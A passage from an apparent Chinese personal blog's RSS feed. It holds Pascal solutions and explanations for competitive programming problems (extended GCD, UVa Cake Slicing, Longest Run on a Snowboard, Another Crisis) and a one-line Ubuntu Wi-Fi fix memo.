class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-comment">// hl:begin #1</span></span><br><span class="line">    gcd_ex(b, a <span class="hljs-keyword">mod</span> b, d, y, x);</span><br><span class="line">    <span class="hljs-comment">// hl:end</span></span><br><span class="line">    y := y-(a <span class="hljs-keyword">div</span> b) * x;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><h2 id="详解">详解</h2><p >乍一看，算法似乎和一般欧几里得算法很是相似：都是递归实现，参数传递过程中都体现了“辗转相除”的思想。那为什么这个算法是正确的呢？这里先解释一下参数：</p><ul><li>a：方程中的参数 a</li><li>b：方程中的参数 b</li><li>d：即 <code>gcd(a,b)</code>。由于和辗转相除法的相似性，在这里最大公约数也可以“顺便”算出。当然，去掉也无大碍</li><li>(x,y)：方程的一组特解 (x, y)</li></ul><p >下面解释标注了 <code class="_hl-label">1</code> 的那行代码。</p><p  class="nomargin"> 假设方程 $ax+by=gcd(a,b)$ 有一组特解 $(x_0,y_0)$。则有$$ax_0+by_0=gcd(a,b)$$</p><p  class="par"> 由最大公约数原理可知：$$gcd(a,b)=gcd(b, a\ mod\ b)$$</p><p  class="par"> 从而有$$ax_0+by_0=gcd(b,a\ mod\ b)$$</p><p  class="par"> 又方程 $bx+(a\ mod\ b)y=gcd(b,a\ mod\ b)$ 一定有整数解，设其为 $(x_1,y_1)$。则有</p><p >$$ax_0+by_0=gcd(b,a\ mod\ b)=bx_1+(a\ mod\ b)y_1$$即$$ax_0+by_0=bx_1+(a-(a\ div\ b)*b)y_1$$</p><p  class="par"> 即 $$a(x_0-y_1)=b(x_1-(a\ div\ b)y_1-y_0)$$</p><p  class="par"> 由恒等原理可知：$$x_0=y_1$$$$y_0=x_1-(a\ div\ b)y_1$$</p><p  class="par"> 因此，当 $a,b\neq0$ 时，$x,y$ 的值可以递归求得。递归边界为：$b=0$ 时 $x=1,y=0$。</p><p >注意到上面的算法用到了一个技巧：在递归传参数的时候将 y, x 调换了。这样做的好处是节省了一个中间变量用来储存 $y_1$，否则在计算 $y_0$ 时 $y_1$ 也被覆盖了。从而使算法更加的精简。</p><h2 id="应用"><strong>应用</strong></h2><ul><li>计算几何中求整点的问题</li><li>求一元一次同余方程 $a\equiv b\pmod{m}$ 的一组特解。（即方程 $ax+my=b$ 的一组特解）</li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/extended-gcd-algorithm/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa10285 Cake Slicing</title>
      <link>https://i.hsfzxjy.site/uva10285-cake-slicing/</link>
      <guid>https://i.hsfzxjy.site/uva10285-cake-slicing/</guid>
      <pubDate>Tue, 30 Sep 2014 20:20:18 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=825&amp;page=show_p</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=825&page=show_problem&problem=4504">Link</a> 耗时：1.825s</p></blockquote><p >这道题做的可真够久的：前前后后加起来将近有两个小时，因此当 AC 的那一刻，自己心中还是挺自豪的。</p><p >事实上，这是一道复杂一点的区间型动态规划，之所以说“复杂”，是因为它的状态转移是<strong>二维</strong>的：切蛋糕既可以横切，也可以纵切。由此我想到了分治算法：</p><blockquote><p  class="noindent"> 假设一个矩形它所需要切的刀数是 f，则 f 可以由组成该矩形的小矩形的 f 值决定。</p></blockquote><p  class="par"> 因此，这个问题具有最优子结构。由于每个状态为一个矩形，因此需要 4 个维度来记录状态（及左上、右下两个顶点）。下面是横切时的状态转移方程，纵切时同理可得：</p><p >$$\begin{aligned}f(up, down, left, right) = &amp;\ min\{f(up, i, left, right) \\                            &amp; + f(i, down, left, right) + right - left\},i = up + 1 .. down -1\end{aligned}$$</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">{$R-}</span></span><br><span class="line"><span class="hljs-keyword">const</span> INF = maxint <span class="hljs-keyword">div</span> <span class="hljs-number">5</span>; <span class="hljs-comment">//正无穷</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    f: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">20</span>, <span class="hljs-number">0</span>..<span class="hljs-number">20</span>, <span class="hljs-number">0</span>..<span class="hljs-number">20</span>, <span class="hljs-number">0</span>..<span class="hljs-number">20</span>] <span class="hljs-keyword">of</span> integer;</span><br><span class="line">    cherries: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">500</span>, <span class="hljs-number">1</span>..<span class="hljs-number">2</span>] <span class="hljs-keyword">of</span> integer;</span><br><span class="line">    map: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">20</span>, <span class="hljs-number">0</span>..<span class="hljs-number">20</span>] <span class="hljs-keyword">of</span> boolean;</span><br><span class="line">    n, m, i, k: integer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">min</span><span class="hljs-params">(x, y: integer)</span>:</span> integer; <span class="hljs-keyword">inline</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x&lt;y <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x) <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span>(y);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cherryin</span><span class="hljs-params">(u, d, l, r: integer)</span>:</span> integer; <span class="hljs-keyword">inline</span>; <span class="hljs-comment">//判断矩形内有没有樱桃</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, j: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    cherryin := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := u+<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> d <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j := l+<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> r <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">if</span> map[i, j] <span class="hljs-keyword">then</span></span><br><span class="line">            <span class="hljs-keyword">begin</span></span><br><span class="line">                inc(cherryin);</span><br><span class="line">                <span class="hljs-keyword">if</span> cherryin = <span class="hljs-number">2</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>;</span><br><span class="line">            <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dp</span><span class="hljs-params">(u, d, l, r: integer)</span>:</span> integer;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    b: integer;</span><br><span class="line">    i: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> f[u, d, l, r] &lt;&gt; -<span class="hljs-number">1</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(f[u,d , l, r]);</span><br><span class="line">    b := cherryin(u, d, l, r);</span><br><span class="line">    <span class="hljs-keyword">if</span> b = <span class="hljs-number">1</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        f[u, d, l, r] := <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> b = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        f[u, d, l, r] := INF;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(INF);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    dp := INF;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := u+<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> d-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">        dp := min(dp, dp(u, i, l, r)+dp(i, d, l, r)+r-l);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := l+<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> r-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">        dp := min(dp, dp(u, d, l, i)+dp(u, d, i, r)+d-u);</span><br><span class="line">    f[u, d, l, r] := dp;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    _: integer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>);reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>);rewrite(output);</span><br><span class="line">    _ := <span class="hljs-number">0</span>;</span><br><span class="line">    readln(n, m, k);</span><br><span class="line">    <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(_);</span><br><span class="line">        fillchar(map, sizeof(map), <span class="hljs-number">0</span>);</span><br><span class="line">        fillchar(f, sizeof(f), -<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> k <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            readln(cherries[i, <span class="hljs-number">1</span>], cherries[i, <span class="hljs-number">2</span>]);</span><br><span class="line">            map[cherries[i, <span class="hljs-number">1</span>], cherries[i, <span class="hljs-number">2</span>]] := true;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        writeln(<span class="hljs-string">&#x27;Case &#x27;</span>,_,<span class="hljs-string">&#x27;: &#x27;</span>, dp(<span class="hljs-number">0</span>,n,<span class="hljs-number">0</span>,m));</span><br><span class="line">        readln(n, m, k);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(input);close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva10285-cake-slicing/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa10285 Longest Run on a Snowboard</title>
      <link>https://i.hsfzxjy.site/uva10285-longest-run-on-a-snowboard/</link>
      <guid>https://i.hsfzxjy.site/uva10285-longest-run-on-a-snowboard/</guid>
      <pubDate>Mon, 29 Sep 2014 06:00:35 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;amp;Itemid=8&amp;amp;page=show_proble</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;category=14&amp;problem=1226&amp;mosmsg=Submission%20received%20with%20ID%2014282250">Link</a> 耗时：0.028s</p></blockquote><p >一道简单的动态规划，主要思路就是：<strong>用 $f[i,j]$ 表示到达 $(i,j)$ 的最长路径的长度。</strong>找到每个最高点，从其开始向四周的低处搜索。如果该点已搜过并且 f 值大于当前长度则退出回溯。直到达到某个最低点为止。</p><p >不多说了，直接上代码：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    delta :<span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">4</span>, <span class="hljs-number">1</span>..<span class="hljs-number">2</span>] <span class="hljs-keyword">of</span> integer = ((-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>)); <span class="hljs-comment">//四个方向向量</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    _: Integer;</span><br><span class="line">    <span class="hljs-keyword">name</span>: <span class="hljs-keyword">string</span>;</span><br><span class="line">    n, m, i, j, x: Integer;</span><br><span class="line">    ans: longint;</span><br><span class="line">    map: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">101</span>, <span class="hljs-number">0</span>..<span class="hljs-number">101</span>] <span class="hljs-keyword">of</span> integer;</span><br><span class="line">    f: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100</span>, <span class="hljs-number">1</span>..<span class="hljs-number">100</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">max</span><span class="hljs-params">(x, y: longint)</span>:</span> longint; <span class="hljs-keyword">inline</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x&gt;y <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x) <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span>(y);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span><span class="hljs-params">(x, y: integer)</span>:</span> Boolean; <span class="hljs-keyword">inline</span>; <span class="hljs-comment">//判断是否是最高点</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line">    tx, ty: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    can := true;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        tx := x + delta[i, <span class="hljs-number">1</span>];</span><br><span class="line">        ty := y + delta[i, <span class="hljs-number">2</span>];</span><br><span class="line">        can := can <span class="hljs-keyword">and</span> (map[x, y] &gt;= map[tx, ty]);</span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> can <span class="hljs-keyword">then</span> <span class="hljs-keyword">break</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dp</span><span class="hljs-params">(x, y: integer; len: longint)</span>;</span> <span class="hljs-comment">//回溯进行动态规划</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i: Integer;</span><br><span class="line">    tx, ty: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    inc(len);</span><br><span class="line">    <span class="hljs-keyword">if</span> f[x, y] &gt; len <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>;</span><br><span class="line">    f[x, y] := len;</span><br><span class="line">    ans := max(ans, len);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">4</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        tx := delta[i, <span class="hljs-number">1</span>] + x;</span><br><span class="line">        ty := delta[i, <span class="hljs-number">2</span>] + y;</span><br><span class="line">        <span class="hljs-keyword">if</span> (tx = <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (tx &gt; n) <span class="hljs-keyword">or</span> (ty = <span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> (ty &gt; m) <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> map[x, y] &lt;= map[tx, ty] <span class="hljs-keyword">then</span> <span class="hljs-keyword">continue</span>;</span><br><span class="line">        dp(tx, ty, len);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">ReadAndProcessName</span>;</span> <span class="hljs-comment">//处理那行该死的名字！！</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    s: <span class="hljs-keyword">string</span>;</span><br><span class="line">    i: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    readln(s);</span><br><span class="line">    i := <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">name</span> := <span class="hljs-string">&#x27;&#x27;</span>;</span><br><span class="line">    n := <span class="hljs-number">0</span>;</span><br><span class="line">    m := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> s[i] &lt;&gt; <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">name</span> := <span class="hljs-keyword">name</span> + s[i];</span><br><span class="line">        inc(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    inc(i);</span><br><span class="line">    <span class="hljs-keyword">while</span> s[i] &lt;&gt; <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        n := n * <span class="hljs-number">10</span> + ord(s[i]) - ord(<span class="hljs-string">&#x27;0&#x27;</span>);</span><br><span class="line">        inc(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    inc(i);</span><br><span class="line">    <span class="hljs-keyword">while</span> i &lt;= length(s) <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        m := m * <span class="hljs-number">10</span> + ord(s[i]) - ord(<span class="hljs-string">&#x27;0&#x27;</span>);</span><br><span class="line">        inc(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>);reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>);rewrite(output);</span><br><span class="line">    readln(_);</span><br><span class="line">    <span class="hljs-keyword">while</span> _&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        dec(_);</span><br><span class="line">        fillchar(map, sizeof(map), <span class="hljs-number">0</span>);</span><br><span class="line">        ReadAndProcessName;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> m <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">begin</span></span><br><span class="line">                <span class="hljs-keyword">read</span>(x);</span><br><span class="line">                map[i, j] := x+<span class="hljs-number">1</span>;</span><br><span class="line">            <span class="hljs-keyword">end</span>;</span><br><span class="line">        readln;</span><br><span class="line"></span><br><span class="line">        fillchar(f, sizeof(f), <span class="hljs-number">0</span>);</span><br><span class="line">        ans := <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> m <span class="hljs-keyword">do</span></span><br><span class="line">                <span class="hljs-keyword">if</span> can(i, j) <span class="hljs-keyword">then</span></span><br><span class="line">                    dp(i, j, <span class="hljs-number">0</span>);</span><br><span class="line">        writeln(<span class="hljs-keyword">name</span>, <span class="hljs-string">&#x27;: &#x27;</span>, ans);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(input);close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva10285-longest-run-on-a-snowboard/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>关于 Ubuntu 突然无法连接 Wifi 的解决方案</title>
      <link>https://i.hsfzxjy.site/ubuntu-suddenly-no-wifi/</link>
      <guid>https://i.hsfzxjy.site/ubuntu-suddenly-no-wifi/</guid>
      <pubDate>Sat, 27 Sep 2014 02:41:31 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;事实上我也不知道发生了什么，大概是几天前插了“小度 Wifi”的缘故。没有任何征兆地，Wifi 就用不了了。其实我也不知道原理，大概是某个驱动被刷掉了。下面是从网上找来的答案：&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK</description>
        
      
      
      
      <content:encoded><![CDATA[<p >事实上我也不知道发生了什么，大概是几天前插了“小度 Wifi”的缘故。没有任何征兆地，Wifi 就用不了了。其实我也不知道原理，大概是某个驱动被刷掉了。下面是从网上找来的答案：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">sudo apt-get install wicd-daemon</span><br></pre></div></div><p >做个记录。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://i.hsfzxjy.site/ubuntu-suddenly-no-wifi/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa12186 Another Crisis &amp;&amp; [Dynamic Arrays in Pascal]</title>
      <link>https://i.hsfzxjy.site/uva12186-another-crisis-dynamic-arrays-in-pascal/</link>
      <guid>https://i.hsfzxjy.site/uva12186-another-crisis-dynamic-arrays-in-pascal/</guid>
      <pubDate>Sat, 27 Sep 2014 00:26:32 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=243&amp;page=show_p</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=243&page=show_problem&problem=3338">Link</a> 耗时：0.586s</p></blockquote><p >昨晚做的太急了，没时间写总结，正好下午有空，补上。</p><p >这是一道典型的树形动态规划，不是很难，但十分坑语言。思路大致如下：</p><p >对于第 $i$ 个节点，用 $d(i)$ 表示其上诉所需的最小工人数。若 $i$ 为叶节点，则 $d(i)=1$；否则，遍历求出 $i$ 的子节点所对应的 $d$ 值，并由小到大排序，取出最小的几个相加，即为 $d(i)$。</p><p >很容易想到用递归来实现。但对于“子节点的 d 值的排序”实现起来却十分困难：因为事先不知道有多少个数。当然啦，如果是 C++ 组，用 <code>vector</code> 可以轻松搞定，可至于 P 党，实现起来却难上加难。思来想去，决定试试 Pascal 的动态数组。磕磕碰碰调了近 1 个小时，终于 AC 了。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">//Accepted</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    tree: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">100000</span>] <span class="hljs-keyword">of</span> <span class="hljs-keyword">array</span> <span class="hljs-keyword">of</span> int64;</span><br><span class="line">    T: Integer;</span><br><span class="line">    f: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">100000</span>] <span class="hljs-keyword">of</span> int64;</span><br><span class="line">    i,l,n,x:longint;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">min</span><span class="hljs-params">(x,y: int64)</span>:</span> int64;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x&lt;y <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x) <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span>(y);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">var</span> arr: <span class="hljs-keyword">array</span> <span class="hljs-keyword">of</span> int64;l,r:longint)</span>;</span> <span class="hljs-keyword">overload</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  i,j:longint;</span><br><span class="line">  m,t: int64;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  i := l;</span><br><span class="line">  j := r;</span><br><span class="line">  m := arr[(l+r) &gt;&gt; <span class="hljs-number">1</span>];</span><br><span class="line">  <span class="hljs-keyword">repeat</span></span><br><span class="line">    <span class="hljs-keyword">while</span> arr[i]&lt;m <span class="hljs-keyword">do</span> inc(i);</span><br><span class="line">    <span class="hljs-keyword">while</span> arr[j]&gt;m <span class="hljs-keyword">do</span> dec(j);</span><br><span class="line">    <span class="hljs-keyword">if</span> i&lt;=j <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">      t := arr[i];</span><br><span class="line">      arr[i] := arr[j];</span><br><span class="line">      arr[j] := t;</span><br><span class="line">      inc(i);</span><br><span class="line">      dec(j);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">  <span class="hljs-keyword">until</span> i&gt;j;</span><br><span class="line">  <span class="hljs-keyword">if</span> i&lt;r <span class="hljs-keyword">then</span> sort(arr, i, r);</span><br><span class="line">  <span class="hljs-keyword">if</span> l&lt;j <span class="hljs-keyword">then</span> sort(arr, l, j);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">var</span> arr: <span class="hljs-keyword">array</span> <span class="hljs-keyword">of</span> int64)</span>;</span> <span class="hljs-keyword">overload</span>;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">  sort(arr, low(arr), high(arr));</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dp</span><span class="hljs-params">(x: longint)</span>:</span> int64;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">  arr: <span class="hljs-keyword">array</span> <span class="hljs-keyword">of</span> int64;</span><br><span class="line">  l,i, num: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> f[x] &lt;&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        dp := f[x];</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> length(tree[x]) = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">      dp := <span class="hljs-number">1</span>;</span><br><span class="line">      f[x] := <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    l := length(tree[x]);</span><br><span class="line">    SetLength(arr, l);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := Low(tree[x]) <span class="hljs-keyword">to</span> High(Tree[x]) <span class="hljs-keyword">do</span></span><br><span class="line">      arr[i] := dp(tree[x][i]);</span><br><span class="line">    Sort(arr);</span><br><span class="line">    num := (l*T-<span class="hljs-number">1</span>) <span class="hljs-keyword">div</span> <span class="hljs-number">100</span>+<span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := Low(arr) <span class="hljs-keyword">to</span> num-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">      f[x] := f[x] + arr[i];</span><br><span class="line">    dp := f[x];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    